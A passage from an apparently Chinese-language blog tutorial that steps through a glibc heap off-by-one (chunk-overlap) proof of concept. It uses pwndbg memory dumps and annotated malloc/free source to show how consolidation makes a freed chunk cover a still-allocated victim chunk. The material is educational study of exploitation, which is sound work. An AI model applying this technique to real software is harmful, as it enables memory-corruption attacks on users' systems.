<span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000004f1</span> <span class="meta">#remainder(unsortedbin)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x00000000000004f0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; unsortedbin</span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757c70</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757c70</span> <span class="comment">/* &#x27;p|uUUU&#x27; */</span></span><br><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757250</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x555555757760</span></span><br><span class="line">Size: <span class="number">0x511</span></span><br><span class="line"></span><br><span class="line"><span class="function">Free <span class="title">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span></span><br><span class="line"><span class="function">Addr: 0x555555757c70</span></span><br><span class="line"><span class="function">Size: 0x4f1</span></span><br><span class="line"><span class="function">fd: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function">bk: 0x7ffff7dcdca0</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">Allocated chunk</span></span><br><span class="line"><span class="function">Addr: 0x555555758160</span></span><br><span class="line"><span class="function">Size: 0x00</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">pwndbg&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>为了之后的叙述方便，我们将现在处于 unsortedbin 中的那个堆块称为 remainder。</p>
</blockquote>
<p>如果细心的话可以发现上述代码框中有一个大小为 0x00 的堆块，并且在正常情况下 heap 命令应该额外打印出 c、barrier 和 top_chunk 这三个堆块；仔细想想就可以知道由于我们在 POC 中将 b 堆块的大小通过 off-by-one 减小了 0x10，因此在对堆块进行切割之后会“多出来 0x10”的空间，<strong>由于堆块的虚拟地址空间都是连续的</strong>，这样会导致 gdb 认为此堆块的大小为 0x00。<br>接下来我们继续调试，如下代码中会申请大小为 0x480 的堆块：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;We malloc &#x27;b2&#x27;, our &#x27;victim&#x27; chunk.\n&quot;</span>);</span><br><span class="line"><span class="comment">// Typically b2 (the victim) will be a structure with valuable pointers that we want to control</span></span><br><span class="line"></span><br><span class="line">b2 = <span class="built_in">malloc</span>(<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;b2: %p\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure>

<p>现在的 last_remainder 为空，如下图所示：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620118719478-bf4930c8-7ce8-4012-a27f-0126893d21f9.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u279437b0&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2016.58.27.png&originHeight=220&originWidth=2120&originalType=binary&size=37377&status=done&style=none&taskId=u2b01eab8-621d-4e7e-801a-07ac223bfaa" alt="截屏2021-05-04 16.58.27.png"><br>可以遇见的是我们会将 remainder（不是 last_remainder）这个堆块先整理到 largebin 中然后对其进行切割：<br>首先放入 largebin 中：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620120286133-5d1cc5b9-3c12-4ce6-8c5f-84759c24b05e.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u8a66caae&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2017.24.42.png&originHeight=536&originWidth=2752&originalType=binary&size=89032&status=done&style=none&taskId=ufa446f03-8462-4310-924d-498951659c4" alt="截屏2021-05-04 17.24.42.png"></p>
<blockquote>
<p>注意 largebin 链上的 0x4c0 并不代表其中堆块的实际结构，具体原因参见 largebin 数据结构。</p>
</blockquote>
<p>因为 nb 对应大小的 largebin 链表上没有合适的堆块，标记在 binmap 中标记 bit 之后准备对这个堆块进行切割：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620132786606-8342cd26-dc33-476e-92dd-45635c8bd45c.png#clientId=u3c0ab4c2-3592-4&from=drop&id=WwuZR&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2020.52.52.png&originHeight=1800&originWidth=2880&originalType=binary&size=477434&status=done&style=none&taskId=u8209a19e-bf8f-4ab3-9204-76e661bab2e" alt="截屏2021-05-04 20.52.52.png"><br>切割的步骤和之前相同，这里不再多说，直接看一下效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000491</span> #b2(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x00007ffff7dce0c0</span>	<span class="number">0x00007ffff7dce0c0</span> #指针不会被清空</span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x0000555555757c70</span>	<span class="number">0x0000555555757c70</span> #指针不会被清空</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620133527780-6c006649-827b-49e5-aa3c-9129f400f66f.png#clientId=u3c0ab4c2-3592-4&from=ui&id=uffd6aecf&margin=%5Bobject%20Object%5D&name=QQ20210504-210518%402x.png&originHeight=1646&originWidth=2742&originalType=binary&size=199042&status=done&style=none&taskId=u5a5dad24-3f69-4ae7-ab6f-cd88d5ef699" alt="QQ20210504-210518@2x.png"><br>同样，这里 gdb 的 heap 出现了问题，这里不管他。为了方便查看，接下来的 POC 代码对 b2 堆块进行填充：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(b2,<span class="string">&#x27;B&#x27;</span>,<span class="number">0x480</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Current b2 content:\n%s\n&quot;</span>,b2);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x00007ffff7dce210</span>	<span class="number">0x00007ffff7dce210</span> <span class="meta">#unsortedbin指针不会被清空</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000555555757760</span>	<span class="number">0x0000555555757760</span> <span class="meta">#largebin指针不会清空</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000491</span> #b2(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>接下来我们对申请的 b1 堆块再次进行 free：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;b1&#x27; and &#x27;c&#x27;: this will consolidate the chunks &#x27;b1&#x27; and &#x27;c&#x27; (forgetting about &#x27;b2&#x27;).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(b1);</span><br></pre></td></tr></table></figure>

<p>这次 free 后会将 b1 放入到 unsortedbin 中，这个过程没有什么好说的，结果如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bin</span><br><span class="line"><span class="comment">//......</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555757760</span> —▸ <span class="number">0x555555758100</span> —▸ <span class="number">0x7ffff7dcdca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555757760</span> <span class="comment">/* &#x27;`wuUUU&#x27; */</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line"><span class="number">0x555555757000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000251</span> #tcache_perthread_struct</span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757250</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> <span class="meta">#a(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">free</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555758100</span>	<span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line">				<span class="meta">#fd					#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000510</span>	<span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span> #填充</span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758790</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x000000000001f871</span> #top_chunk</span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557588f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>

<p>接下来又是一个重点，这次 free 牵扯到堆块的合并问题：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(c);</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620134877077-ad8d4368-433b-47bb-9f81-4de1e349bb2f.png#clientId=u3c0ab4c2-3592-4&from=drop&id=iSgR1&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2021.27.50.png&originHeight=1800&originWidth=2880&originalType=binary&size=477183&status=done&style=none&taskId=u1e56075b-a420-49bc-98ef-2343dacf1fc" alt="截屏2021-05-04 21.27.50.png"><br>我们调试到如上图所示的地方，我们将 malloc 源码单独的摘出来看一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ); <span class="comment">//清空堆块的内容</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">#此时的堆块内存如下：</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000511</span> #b1(<span class="built_in">malloc</span>)</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555758100</span>	<span class="number">0x00007ffff7dcdca0</span> <span class="meta">#changed</span></span><br><span class="line">				<span class="meta">#fd					#bk</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> <span class="meta">#changed</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000510</span>	<span class="number">0x0000000000000490</span> <span class="meta">#changed #b2(malloc)</span></span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x5555557580f0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span></span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin)</span></span><br><span class="line"><span class="number">0x555555758110</span>:	<span class="number">0x00007ffff7dcdca0</span>	<span class="number">0x00007ffff7dcdca0</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758160</span>:	<span class="number">0x0000000000000060</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555758170</span>:	<span class="number">0x0000000000000a10</span>	<span class="number">0x0000000000000510</span> <span class="meta">#c(free) 【malloc源码中的p堆块】</span></span><br><span class="line">......</span><br><span class="line"><span class="number">0x555555758680</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000111</span> <span class="meta">#barrier(malloc)【malloc源码中的nextchunk】</span></span><br><span class="line">-------------------------------------------------------------------</span><br><span class="line">    <span class="comment">/* consolidate backward */</span> <span class="comment">//向后合并</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123; <span class="comment">//prev_inuse(p):获取p的PREV_INUSE标志位==0</span></span><br><span class="line">    	<span class="comment">//进入if语句，p的PREV_INUSE标志位代表着p之前的堆块的状态，现在处于free状态</span></span><br><span class="line">      prevsize = prev_size (p); <span class="comment">//获取p的mchunk_prev_size==0xa10</span></span><br><span class="line">      size += prevsize; <span class="comment">//size=size+prevsize-&gt;size==0xa10+0x510=0xf20</span></span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      	<span class="comment">//#define chunk_at_offset(p, s)  ((mchunkptr) (((char *) (p)) + (s)))</span></span><br><span class="line">        <span class="comment">//p==0x555555757760</span></span><br><span class="line">      unlink(av, p, bck, fwd); <span class="comment">//对p堆块进行unlink</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>unlink 之后结果如下：<br><img src="https://cdn.nlark.com/yuque/0/2021/png/574026/1620136248681-222f18f7-6985-4642-9c30-958a3b559571.png#clientId=u3c0ab4c2-3592-4&from=drop&id=u7a3d72ef&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-05-04%2021.50.40.png&originHeight=682&originWidth=2744&originalType=binary&size=85286&status=done&style=none&taskId=u95d92572-fbb0-4c3a-b371-e6e11c2e118" alt="截屏2021-05-04 21.50.40.png"><br>最终执行如下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class="line">     <span class="comment">/* get and clear inuse bit */</span></span><br><span class="line">     nextinuse = inuse_bit_at_offset(nextchunk, nextsize); <span class="comment">//nextinuse==1</span></span><br><span class="line">		<span class="meta">#<span class="meta-keyword">define</span> inuse_bit_at_offset(p, s)					      \</span></span><br><span class="line"><span class="meta"> 			#(((mchunkptr) (((char *) (p)) + (s)))-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line">     <span class="comment">/* consolidate forward */</span>   <span class="comment">//向前合并</span></span><br><span class="line">     <span class="keyword">if</span> (!nextinuse) &#123; <span class="comment">//这里的nextinuse代表着p的下一个的下一个堆块的PREV_INUSE标志位情况</span></span><br><span class="line">         <span class="comment">//现在不会进入if语句</span></span><br><span class="line">unlink(av, nextchunk, bck, fwd); <span class="comment">//如果p的下一个堆块也处于free状态，则进行合并</span></span><br><span class="line">size += nextsize;</span><br><span class="line">     &#125; <span class="keyword">else</span></span><br><span class="line">clear_inuse_bit_at_offset(nextchunk, <span class="number">0</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Place the chunk in unsorted chunk list. Chunks are</span></span><br><span class="line"><span class="comment">not placed into regular bins until after they have</span></span><br><span class="line"><span class="comment">been given one chance to be used in malloc.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">     bck = unsorted_chunks(av);---------------------------------</span><br><span class="line">     fwd = bck-&gt;fd;											｜</span><br><span class="line">     <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))					｜--&gt;unsortedbin双向链表完整性检查</span><br><span class="line">malloc_printerr (<span class="string">&quot;free(): corrupted unsorted chunks&quot;</span>);-------</span><br><span class="line">     p-&gt;fd = fwd;----------------------------</span><br><span class="line">     p-&gt;bk = bck;							 ｜</span><br><span class="line">     <span class="keyword">if</span> (!in_smallbin_range(size))			 ｜</span><br><span class="line">&#123;										 ｜</span><br><span class="line">  p-&gt;fd_nextsize = <span class="literal">NULL</span>;				 ｜----&gt;p堆块链入unsortedbin中</span><br><span class="line">  p-&gt;bk_nextsize = <span class="literal">NULL</span>;				 ｜</span><br><span class="line">&#125;										 ｜</span><br><span class="line">     bck-&gt;fd = p;							 ｜</span><br><span class="line">     fwd-&gt;bk = p;----------------------------</span><br><span class="line"></span><br><span class="line">     set_head(p, size | PREV_INUSE); <span class="comment">//size|PREV_INUSE==0xf20|0x1==0xf21</span></span><br><span class="line">     set_foot(p, size); <span class="comment">//size==0xf20</span></span><br><span class="line"></span><br><span class="line">     check_free_chunk(av, p);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>执行完毕后部分内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">800</span>gx <span class="number">0x555555757000</span></span><br><span class="line">.....</span><br><span class="line"><span class="number">0x555555757760</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000f21</span> #b1(<span class="built_in">malloc</span>)-------------------</span><br><span class="line">    								#set_head										|</span><br><span class="line"><span class="number">0x555555757770</span>:	<span class="number">0x0000555555758100</span>	<span class="number">0x00007ffff7dcdca0</span> 								|</span><br><span class="line">				<span class="meta">#fd					#bk												|</span></span><br><span class="line"><span class="number">0x555555757780</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span> 								|</span><br><span class="line">......																				|</span><br><span class="line"><span class="number">0x555555757c70</span>:	<span class="number">0x0000000000000510</span>	<span class="number">0x0000000000000490</span> #b2(<span class="built_in">malloc</span>)					|</span><br><span class="line"><span class="number">0x555555757c80</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>								|</span><br><span class="line"><span class="number">0x555555757c90</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>		   b1实际控制的区域 &lt;-----｜</span><br><span class="line">......																				｜</span><br><span class="line"><span class="number">0x5555557580f0</span>:	<span class="number">0x4242424242424242</span>	<span class="number">0x4242424242424242</span>								｜</span><br><span class="line"><span class="number">0x555555758100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000061</span> <span class="meta">#remainder(free-unsortedbin) 